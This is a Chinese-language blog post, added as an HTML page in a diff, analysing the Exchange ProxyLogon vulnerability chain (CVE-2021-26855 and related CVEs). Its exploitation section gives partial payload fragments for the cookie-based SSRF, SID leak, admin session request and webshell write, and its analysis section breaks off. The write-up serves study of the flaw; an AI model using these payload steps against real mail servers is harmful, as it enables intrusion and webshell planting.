@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="参考： https:&#x2F;&#x2F;www.volexity.com&#x2F;blog&#x2F;2021&#x2F;03&#x2F;02&#x2F;active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities&#x2F; https:&#x2F;&#x2F;testbnull.medium.com&#x2F;ph%C3%A2n-t%C3%ADch-l%E1%BB%97-h%E1%BB%95ng-proxylogon-mai">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Exchange ProxyLogon RCE">
+<meta property="og:url" content="https://tuagt.github.io/2021/03/15/Exchange-ProxyLogon-RCE/index.html">
+<meta property="og:site_name" content="TuAgT&#39;s Blog">
+<meta property="og:description" content="参考： https:&#x2F;&#x2F;www.volexity.com&#x2F;blog&#x2F;2021&#x2F;03&#x2F;02&#x2F;active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities&#x2F; https:&#x2F;&#x2F;testbnull.medium.com&#x2F;ph%C3%A2n-t%C3%ADch-l%E1%BB%97-h%E1%BB%95ng-proxylogon-mai">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-03-15T01:47:56.000Z">
+<meta property="article:modified_time" content="2025-12-28T15:39:10.543Z">
+<meta property="article:author" content="TuAgT">
+<meta property="article:tag" content="web security">
+<meta property="article:tag" content="Exchenge">
+<meta property="article:tag" content="RCE">
+<meta property="article:tag" content="CVE-2021-26855">
+<meta property="article:tag" content="CVE-2021-27065">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Exchange ProxyLogon RCE</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">项目</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2021/03/14/%E4%BF%AE%E6%94%B9Users%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E5%A4%B9%E5%90%8D/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://tuagt.github.io/2021/03/15/Exchange-ProxyLogon-RCE/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://tuagt.github.io/2021/03/15/Exchange-ProxyLogon-RCE/&text=Exchange ProxyLogon RCE"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://tuagt.github.io/2021/03/15/Exchange-ProxyLogon-RCE/&title=Exchange ProxyLogon RCE"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://tuagt.github.io/2021/03/15/Exchange-ProxyLogon-RCE/&is_video=false&description=Exchange ProxyLogon RCE"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Exchange ProxyLogon RCE&body=Check out this article: https://tuagt.github.io/2021/03/15/Exchange-ProxyLogon-RCE/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://tuagt.github.io/2021/03/15/Exchange-ProxyLogon-RCE/&title=Exchange ProxyLogon RCE"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://tuagt.github.io/2021/03/15/Exchange-ProxyLogon-RCE/&title=Exchange ProxyLogon RCE"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://tuagt.github.io/2021/03/15/Exchange-ProxyLogon-RCE/&title=Exchange ProxyLogon RCE"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://tuagt.github.io/2021/03/15/Exchange-ProxyLogon-RCE/&title=Exchange ProxyLogon RCE"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://tuagt.github.io/2021/03/15/Exchange-ProxyLogon-RCE/&name=Exchange ProxyLogon RCE&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://tuagt.github.io/2021/03/15/Exchange-ProxyLogon-RCE/&t=Exchange ProxyLogon RCE"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">参考：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%AF%A6%E6%83%85%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">漏洞详情：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">利用过程：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">4.</span> <span class="toc-text">细节分析：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8D%E8%AF%8D%E8%A7%A3%E9%87%8A%EF%BC%9A"><span class="toc-number">5.</span> <span class="toc-text">名词解释：</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Exchange ProxyLogon RCE
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">ENDZHT</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-03-15T01:47:56.000Z" class="dt-published" itemprop="datePublished">2021-03-15</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CVE-2021-26855/" rel="tag">CVE-2021-26855</a>, <a class="p-category" href="/tags/CVE-2021-27065/" rel="tag">CVE-2021-27065</a>, <a class="p-category" href="/tags/Exchenge/" rel="tag">Exchenge</a>, <a class="p-category" href="/tags/RCE/" rel="tag">RCE</a>, <a class="p-category" href="/tags/web-security/" rel="tag">web security</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h3 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h3><ul>
+<li><a target="_blank" rel="noopener" href="https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/">https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/</a></li>
+<li><a target="_blank" rel="noopener" href="https://testbnull.medium.com/ph%C3%A2n-t%C3%ADch-l%E1%BB%97-h%E1%BB%95ng-proxylogon-mail-exchange-rce-s%E1%BB%B1-k%E1%BA%BFt-h%E1%BB%A3p-ho%C3%A0n-h%E1%BA%A3o-cve-2021-26855-37f4b6e06265">https://testbnull.medium.com/ph%C3%A2n-t%C3%ADch-l%E1%BB%97-h%E1%BB%95ng-proxylogon-mail-exchange-rce-s%E1%BB%B1-k%E1%BA%BFt-h%E1%BB%A3p-ho%C3%A0n-h%E1%BA%A3o-cve-2021-26855-37f4b6e06265</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/mil1200/ProxyLogon-CVE-2021-26855">https://github.com/mil1200/ProxyLogon-CVE-2021-26855</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/">https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/234607">https://www.anquanke.com/post/id/234607</a></li>
+</ul>
+<h3 id="漏洞详情："><a href="#漏洞详情：" class="headerlink" title="漏洞详情："></a>漏洞详情：</h3><p><a target="_blank" rel="noopener" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26855">CVE-2021-26855</a>是<a target="_blank" rel="noopener" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26855">Exchange</a>中的一个服务器端请求伪造（SSRF）漏洞，它使攻击者能够发送任意HTTP请求并通过Exchange Server进行身份验证。</p>
+<p><a target="_blank" rel="noopener" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26857">CVE-2021-26857</a>是统一消息服务中的不安全的反序列化漏洞。不安全的反序列化是不可信的用户可控制数据被程序反序列化的地方。利用此漏洞，HAFNIUM可以在Exchange服务器上以SYSTEM身份运行代码。这需要管理员权限或要利用的另一个漏洞。</p>
+<p><a target="_blank" rel="noopener" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26858">CVE-2021-26858</a>是Exchange中身份验证后的任意文件写入漏洞。如果HAFNIUM可以通过Exchange服务器进行身份验证，则他们可以使用此漏洞将文件写入服务器上的任何路径。他们可以通过利用CVE-2021-26855 SSRF漏洞或通过破坏合法管理员的凭据来进行身份验证。</p>
+<p><a target="_blank" rel="noopener" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-27065">CVE-2021-27065</a>是Exchange中身份验证后的任意文件写入漏洞。如果HAFNIUM可以通过Exchange服务器进行身份验证，则他们可以使用此漏洞将文件写入服务器上的任何路径。他们可以通过利用CVE-2021-26855 SSRF漏洞或通过破坏合法管理员的凭据来进行身份验证。</p>
+<h3 id="利用过程："><a href="#利用过程：" class="headerlink" title="利用过程："></a>利用过程：</h3><ol>
+<li><p>获取LegacyDN。利用CVE-2021-26855 ssrf攻击。</p>
+<p>使用&#x2F;Autodiscover&#x2F;autodiscover.xml入口点来检索请求的输入主体</p>
+<p>payload：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&quot;Cookie&quot;: &quot;X-BEResource=%s/autodiscover/autodiscover.xml?a=~1942062522;&quot; % FQDN</span><br><span class="line"></span><br><span class="line">&lt;Autodiscover xmlns=&quot;http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006&quot;&gt;</span><br><span class="line">    &lt;Request&gt;</span><br><span class="line">      &lt;EMailAddress&gt;%s&lt;/EMailAddress&gt; &lt;AcceptableResponseSchema&gt;http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a&lt;/AcceptableResponseSchema&gt;</span><br><span class="line">    &lt;/Request&gt;</span><br><span class="line">&lt;/Autodiscover&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>获取SID，并置换成管理员SID。</p>
+<p>使用入口点：&#x2F;autodiscover&#x2F;autodiscover.xml和&#x2F; mapi &#x2F; emsmdb</p>
+<p>发生错误时，入口点&#x2F; mapi处的功能部件将返回SID</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mapi_body = legacyDn + \</span><br><span class="line">    &quot;\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00&quot;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>获取Session id和msExchEcpCanary。CVE-2021-26855</p>
+<p>使用入口点：&#x2F;ecp&#x2F;proxyLogon.ecp获取Session ID和Canary</p>
+<p>payload：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxyLogon_request = &quot;&quot;&quot;&lt;r at=&quot;Negotiate&quot; ln=&quot;john&quot;&gt;&lt;s&gt;%s&lt;/s&gt;&lt;s a=&quot;7&quot; t=&quot;1&quot;&gt;S-1-1-0&lt;/s&gt;&lt;s a=&quot;7&quot; t=&quot;1&quot;&gt;S-1-5-2&lt;/s&gt;&lt;s a=&quot;7&quot; t=&quot;1&quot;&gt;S-1-5-11&lt;/s&gt;&lt;s a=&quot;7&quot; t=&quot;1&quot;&gt;S-1-5-15&lt;/s&gt;&lt;s a=&quot;3221225479&quot; t=&quot;1&quot;&gt;S-1-5-5-0-6948923&lt;/s&gt;&lt;/r&gt;</span><br><span class="line">&quot;&quot;&quot; % sid</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>利用CVE-2021–27065写入webshell</p>
+<p>攻击者使用Exchange管理中心中的ResetOAB功能来写入文件。</p>
+</li>
+</ol>
+<h3 id="细节分析："><a href="#细节分析：" class="headerlink" title="细节分析："></a>细节分析：</h3><ol>
+<li><p>请求&#x2F;ecp&#x2F;x.js，请求&#x2F;ecp下以.js、.css结尾的静态资源，会交由<code>BEResourceRequestHandler</code>处理，确定类是否可以处理请求是基于方法<code>BEResourceRequestHandler.CanHandle()</code>，使用<code>GetBEResouceCookie()</code>方法检查特殊cookie的存在，此方法获取并返回<code>X-BEResource</code>的值。</p>
+<p>然后<code>BEResourceRequestHandler.IsResourceRequest()</code>将检查请求URL是否以资源文件结尾，最后值<code>X-BEResource</code>将继续传递到<code>BackEndServer.FromString()</code>，以确定此请求的后端服务器。</p>
+<p>为了满足上述条件，<code>X-BEResource</code>需要具备下面的形式</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-BEResource = EXCHANGE2016〜1942062522</span><br></pre></td></tr></table></figure>
+</li>
+<li></li>
+</ol>
+<h3 id="名词解释："><a href="#名词解释：" class="headerlink" title="名词解释："></a>名词解释：</h3><ul>
+<li>LegacyDN：Exchange Server 2013开始引入，使用邮箱的专有名称标识邮箱</li>
+<li>FQDN：标识内部Exchange服务器的完全限定域名</li>
+</ul>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/probberechts">项目</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">参考：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%AF%A6%E6%83%85%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">漏洞详情：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">利用过程：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">4.</span> <span class="toc-text">细节分析：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8D%E8%AF%8D%E8%A7%A3%E9%87%8A%EF%BC%9A"><span class="toc-number">5.</span> <span class="toc-text">名词解释：</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://tuagt.github.io/2021/03/15/Exchange-ProxyLogon-RCE/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://tuagt.github.io/2021/03/15/Exchange-ProxyLogon-RCE/&text=Exchange ProxyLogon RCE"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://tuagt.github.io/2021/03/15/Exchange-ProxyLogon-RCE/&title=Exchange ProxyLogon RCE"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://tuagt.github.io/2021/03/15/Exchange-ProxyLogon-RCE/&is_video=false&description=Exchange ProxyLogon RCE"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Exchange ProxyLogon RCE&body=Check out this article: https://tuagt.github.io/2021/03/15/Exchange-ProxyLogon-RCE/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://tuagt.github.io/2021/03/15/Exchange-ProxyLogon-RCE/&title=Exchange ProxyLogon RCE"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://tuagt.github.io/2021/03/15/Exchange-ProxyLogon-RCE/&title=Exchange ProxyLogon RCE"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://tuagt.github.io/2021/03/15/Exchange-ProxyLogon-RCE/&title=Exchange ProxyLogon RCE"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://tuagt.github.io/2021/03/15/Exchange-ProxyLogon-RCE/&title=Exchange ProxyLogon RCE"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://tuagt.github.io/2021/03/15/Exchange-ProxyLogon-RCE/&name=Exchange ProxyLogon RCE&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://tuagt.github.io/2021/03/15/Exchange-ProxyLogon-RCE/&t=Exchange ProxyLogon RCE"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    TuAgT
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">项目</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
